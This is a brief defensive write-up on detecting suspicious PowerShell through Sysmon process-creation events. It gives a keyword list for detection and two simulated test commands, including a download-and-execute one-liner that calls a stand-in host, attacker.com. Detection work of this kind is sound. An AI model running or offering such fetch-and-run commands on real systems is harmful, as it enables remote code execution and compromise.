🔍 Detection Logic for Suspicious PowerShell Activity

📁 Log Source:
Microsoft Sysmon (System Monitor)
→ Event ID 1 (Process Creation)

🛠️ Detection Goal:
Identify PowerShell commands that show signs of:
- Obfuscation
- Download and execution of remote scripts
- Use of encoded or hidden payloads

🔎 What We Looked For:
- Command line includes:
    - powershell -EncodedCommand
    - IEX
    - Invoke-Expression
    - DownloadString
    - FromBase64String

📊 Simulated Commands Used:
1. powershell -EncodedCommand ZQBj...
2. powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script')"

🧠 Why It Matters:
These command patterns are commonly used in:
- Initial access via phishing
- Malware droppers
- Fileless attacks
- Reverse shell scripts

📌 Recommendation:
Create a detection rule (e.g., Sigma or Windows Event Forwarding filter) that triggers an alert if:
- Image is powershell.exe
- CommandLine contains suspicious keywords

✅ Outcome:
Confirmed Sysmon successfully captured these commands under Event ID 1. Analysis completed manually using Event Viewer.
